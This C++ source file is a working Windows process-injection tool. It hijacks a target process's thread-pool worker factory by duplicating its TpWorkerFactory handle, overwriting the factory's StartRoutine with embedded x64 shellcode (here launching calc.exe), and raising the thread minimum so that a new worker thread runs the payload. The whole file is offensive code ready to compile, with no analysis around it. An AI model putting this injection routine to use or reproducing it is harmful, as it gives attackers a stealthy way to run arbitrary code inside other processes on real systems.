#include <Windows.h>
#include <iostream>
#include <vector>
#include <winternl.h>

#pragma comment(lib, "ntdll")

#define WORKER_FACTORY_RELEASE_WORKER 0x0001
#define WORKER_FACTORY_WAIT 0x0002
#define WORKER_FACTORY_SET_INFORMATION 0x0004
#define WORKER_FACTORY_QUERY_INFORMATION 0x0008
#define WORKER_FACTORY_READY_WORKER 0x0010
#define WORKER_FACTORY_SHUTDOWN 0x0020

#define WORKER_FACTORY_ALL_ACCESS ( \
       STANDARD_RIGHTS_REQUIRED | \
       WORKER_FACTORY_RELEASE_WORKER | \
       WORKER_FACTORY_WAIT | \
       WORKER_FACTORY_SET_INFORMATION | \
       WORKER_FACTORY_QUERY_INFORMATION | \
       WORKER_FACTORY_READY_WORKER | \
       WORKER_FACTORY_SHUTDOWN \
)

unsigned char g_Shellcode[] =
"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";

typedef enum _SET_WORKERFACTORYINFOCLASS
{
	WorkerFactoryTimeout = 0,
	WorkerFactoryRetryTimeout = 1,
	WorkerFactoryIdleTimeout = 2,
	WorkerFactoryBindingCount = 3,
	WorkerFactoryThreadMinimum = 4,
	WorkerFactoryThreadMaximum = 5,
	WorkerFactoryPaused = 6,
	WorkerFactoryAdjustThreadGoal = 8,
	WorkerFactoryCallbackType = 9,
	WorkerFactoryStackInformation = 10,
	WorkerFactoryThreadBasePriority = 11,
	WorkerFactoryTimeoutWaiters = 12,
	WorkerFactoryFlags = 13,
	WorkerFactoryThreadSoftMaximum = 14,
	WorkerFactoryMaxInfoClass = 15 /* Not implemented */
} SET_WORKERFACTORYINFOCLASS, * PSET_WORKERFACTORYINFOCLASS;

typedef enum _QUERY_WORKERFACTORYINFOCLASS
{
	WorkerFactoryBasicInformation = 7,
} QUERY_WORKERFACTORYINFOCLASS, * PQUERY_WORKERFACTORYINFOCLASS;

typedef struct _WORKER_FACTORY_BASIC_INFORMATION
{
	LARGE_INTEGER Timeout;
	LARGE_INTEGER RetryTimeout;
	LARGE_INTEGER IdleTimeout;
	BOOLEAN Paused;
	BOOLEAN TimerSet;
	BOOLEAN QueuedToExWorker;
	BOOLEAN MayCreate;
	BOOLEAN CreateInProgress;
	BOOLEAN InsertedIntoQueue;
	BOOLEAN Shutdown;
	ULONG BindingCount;
	ULONG ThreadMinimum;
	ULONG ThreadMaximum;
	ULONG PendingWorkerCount;
	ULONG WaitingWorkerCount;
	ULONG TotalWorkerCount;
	ULONG ReleaseCount;
	LONGLONG InfiniteWaitGoal;
	PVOID StartRoutine;
	PVOID StartParameter;
	HANDLE ProcessId;
	SIZE_T StackReserve;
	SIZE_T StackCommit;
	NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, * PWORKER_FACTORY_BASIC_INFORMATION;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
	HANDLE HandleValue;
	ULONG_PTR HandleCount;
	ULONG_PTR PointerCount;
	ACCESS_MASK GrantedAccess;
	ULONG ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

EXTERN_C
NTSTATUS NTAPI NtQueryInformationWorkerFactory(
	_In_ HANDLE WorkerFactoryHandle,
	_In_ QUERY_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
	_In_reads_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
	_In_ ULONG WorkerFactoryInformationLength,
	_Out_opt_ PULONG ReturnLength
);

EXTERN_C
NTSTATUS NTAPI NtSetInformationWorkerFactory(
	_In_ HANDLE WorkerFactoryHandle,
	_In_ SET_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
	_In_reads_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
	_In_ ULONG WorkerFactoryInformationLength
);

int main(int argc, char* argv[])
{

	HANDLE hTargetProcess;
	DWORD TargetPID = 0;

	TargetPID = atoi(argv[1]);

	hTargetProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, TargetPID);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		printf("[-] OpenProcess failed: 0x%08X\n", GetLastError());
		return 1;
	}

	printf("[+] Opened a remote handle to the target process %d: 0x%p\n", TargetPID, hTargetProcess);

	ULONG InformationLength = 0;
	auto status = 0x0; // STATUS_SUCCESS
	std::vector<BYTE> Information;

	do {
		Information.resize(InformationLength);
		// ProcessHandleInformation == 51
		status = NtQueryInformationProcess(hTargetProcess, (PROCESSINFOCLASS)51, Information.data(), InformationLength, &InformationLength);
	} while (status == 0xffffffffc0000004);

	if (status != 0x0) {
		printf("[-] NtQueryInformationProcess failed.\n");
		return 1;
	}

	const auto pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information.data());

	HANDLE hDuplicatedObject = INVALID_HANDLE_VALUE;
	std::vector<BYTE> pObjectInformation;
	PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;

	for (auto i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {

		BOOL bResult = DuplicateHandle(hTargetProcess, pProcessHandleInformation->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicatedObject, WORKER_FACTORY_ALL_ACCESS, FALSE, NULL);

		if (bResult == 0x0) {
			printf("[-] DuplicateHandle failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}
		
		ULONG InformationLen = 0;
		do {

			pObjectInformation.resize(InformationLen);
			status = NtQueryObject(hDuplicatedObject, (OBJECT_INFORMATION_CLASS)2, pObjectInformation.data(), InformationLen, &InformationLen);

		} while (status == 0xffffffffc0000004);

		if (status != 0x0) {
			printf("[-] NtQueryObject failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation.data();

		printf("%ls - 0x%p\n", (wchar_t*)pObjectTypeInformation->TypeName.Buffer, hDuplicatedObject);

		if (wcscmp(L"TpWorkerFactory", pObjectTypeInformation->TypeName.Buffer) == 0) {
			printf("[+] Got a TpWorkerFactory handle: 0x%p\n", hDuplicatedObject);
			break;
		}

		continue;
	}

	if (hDuplicatedObject == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to duplicate TpWorkerFactory handle.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}

	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };

	status = NtQueryInformationWorkerFactory(hDuplicatedObject, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), nullptr);
	if (status != 0x0) {
		printf("[-] NtQueryInformationWorkerFactory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	PVOID ShellCodeAddress = WorkerFactoryInformation.StartRoutine;

	printf("[+] Memory where the shellcode will reside in remote process: 0x%p\n", ShellCodeAddress);

	BOOL bResult = WriteProcessMemory(hTargetProcess, ShellCodeAddress, g_Shellcode, sizeof(g_Shellcode), nullptr);

	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	ULONG WorkerFactoryMinimumThreadNumber = WorkerFactoryInformation.TotalWorkerCount + 1;
	status = NtSetInformationWorkerFactory(hDuplicatedObject, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));

	if (status != 0x0) {
		printf("[-] NtSetInformationWorkerFactory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Shellcode was executed by a new worker thread.\n");
	CloseHandle(hTargetProcess);
	CloseHandle(hDuplicatedObject);
	return 0;
}
